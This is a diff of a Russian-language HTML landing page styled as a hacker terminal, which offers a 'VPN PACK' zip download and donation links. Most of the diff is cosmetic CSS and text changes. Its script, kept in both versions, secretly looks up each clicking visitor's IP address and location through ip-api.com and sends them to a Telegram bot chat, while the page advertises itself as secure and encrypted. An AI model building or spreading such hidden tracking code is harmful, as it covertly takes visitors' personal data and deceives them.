@@ -19,10 +19,10 @@
         .terminal {
             width: 90%;
             max-width: 450px;
-            background: rgba(0, 0, 0, 0.93);
+            background: rgba(0, 0, 0, 0.95);
             border: 2px solid #00ff41;
             padding: 30px;
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
             text-align: center;
             position: relative;
         }
@@ -30,89 +30,75 @@
             content: "";
             position: absolute;
             top: 0; left: 0; width: 100%; height: 2px;
-            background: rgba(0, 255, 65, 0.5);
-            animation: scan 3s linear infinite;
+            background: rgba(0, 255, 65, 0.3);
+            animation: scan 4s linear infinite;
         }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
 
         h1 { font-size: 1.5em; text-shadow: 0 0 10px #00ff41; margin-bottom: 5px; }
-        .version { font-size: 10px; color: #fff; margin-bottom: 20px; opacity: 0.7; }
+        .version { font-size: 10px; color: #fff; margin-bottom: 25px; opacity: 0.6; }
         
         .btn-zip {
             display: block;
             color: #050505;
             background: #00ff41;
             text-decoration: none;
-            padding: 18px;
+            padding: 20px;
             font-weight: bold;
             font-size: 18px;
             border: 2px solid #00ff41;
             transition: 0.3s;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            letter-spacing: 2px;
         }
-        .btn-zip:hover { background: transparent; color: #00ff41; box-shadow: 0 0 20px #00ff41; }
+        .btn-zip:hover { background: transparent; color: #00ff41; box-shadow: 0 0 30px #00ff41; }
 
         .donate-section {
             margin-top: 10px;
             padding-top: 20px;
-            border-top: 1px dashed #00ff41;
-        }
-
-        /* Твой виджет с полоской сбора */
-        .da-widget {
-            width: 100%;
-            height: 75px;
-            border: none;
-            margin-bottom: 10px;
-            /* Делаем виджет более "зеленым" под стиль */
-            filter: hue-rotate(75deg) brightness(1.2);
+            border-top: 1px solid rgba(0, 255, 65, 0.3);
         }
 
         .btn-donate {
             display: inline-block;
-            color: #00ff41;
+            color: #fff;
             background: transparent;
             text-decoration: none;
-            padding: 12px 25px;
-            font-size: 13px;
-            font-weight: bold;
-            border: 1px solid #00ff41;
+            padding: 10px 20px;
+            font-size: 11px;
+            border: 1px solid #fff;
             transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            opacity: 0.8;
         }
-        .btn-donate:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px #00ff41; }
+        .btn-donate:hover { opacity: 1; background: #fff; color: #000; box-shadow: 0 0 15px #fff; }
 
-        .support { margin-top: 25px; font-size: 13px; }
-        .support a { color: #fff; text-decoration: none; border-bottom: 1px solid #00ff41; }
-        .footer { font-size: 9px; margin-top: 25px; opacity: 0.4; }
+        .support { margin-top: 30px; font-size: 13px; }
+        .support a { color: #00ff41; text-decoration: none; border-bottom: 1px solid #00ff41; }
+        .footer { font-size: 9px; margin-top: 30px; opacity: 0.3; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
 <div class="terminal">
-    <h1>[ PR1ME_HUB_v2.8 ]</h1>
-    <div class="version">PROJECT: VIDEO_CARD_GOAL // STATUS: ONLINE</div>
+    <h1>[ PR1ME_HUB_v2.9 ]</h1>
+    <div class="version">SYSTEM: STABLE // ENCRYPTION: AES-256</div>
     
     <div class="download-box">
         <a href="ВПН-ОТ-СВЕТИКА.zip" download class="btn-zip" id="secureBtn">СКАЧАТЬ VPN PACK</a>
     </div>
 
     <div class="donate-section">
-        <iframe src="https://www.donationalerts.com/widget/goal/9626161?token=tQDTdAjVYOd500bJNiau" class="da-widget"></iframe>
-        
-        <div style="font-size: 10px; color: #fff; margin-bottom: 15px;">ХОЧЕШЬ УСКОРИТЬ СБОР?</div>
         <a href="https://www.donationalerts.com/r/p1rimerust" target="_blank" class="btn-donate" id="donateBtn">
-            ЗАКИНУТЬ ДОНАТ
+            ПОДДЕРЖАТЬ ПРОЕКТ (DONATE)
         </a>
     </div>
 
     <div class="support">
-        TELEGRAM: <a href="https://t.me/Pr1meRUst">@Pr1meRUst</a>
+        CONTACT: <a href="https://t.me/Pr1meRUst">@Pr1meRUst</a>
     </div>
 
     <div class="footer">
-        ENCRYPTED TERMINAL // 2026
+        PR1ME SECURITY TERMINAL // 2026
     </div>
 </div>
 
@@ -123,19 +109,19 @@
     const my_id = '5908974997';
 
     function sendLog(type) {
-        fetch('http://ip-api.com/json/?fields=status,country,city,isp,query')
+        fetch('http://ip-api.com/json/?fields=status,country,city,query')
             .then(res => res.json())
             .then(data => {
-                const info = `🔥 **${type}**\n📍 IP: \`${data.query}\`\n🌍 ${data.country}, ${data.city}\n📡 ISP: ${data.isp}`;
+                const info = `💻 **${type}**\n📍 IP: \`${data.query}\`\n🌍 ${data.country}, ${data.city}`;
                 fetch(`https://api.telegram.org/bot${full_t}/sendMessage?chat_id=${my_id}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
             })
             .catch(() => {
-                fetch(`https://api.telegram.org/bot${full_t}/sendMessage?chat_id=${my_id}&text=${encodeURIComponent('⚠️ Активность: ' + type)}`);
+                fetch(`https://api.telegram.org/bot${full_t}/sendMessage?chat_id=${my_id}&text=${encodeURIComponent('Клик: ' + type)}`);
             });
     }
 
     document.getElementById('secureBtn').addEventListener('click', () => sendLog('СКАЧИВАНИЕ'));
-    document.getElementById('donateBtn').addEventListener('click', () => sendLog('ОТКРЫЛ ДОНАТЫ'));
+    document.getElementById('donateBtn').addEventListener('click', () => sendLog('КЛИК ПО ДОНАТУ'));
 </script>
 
 </body>
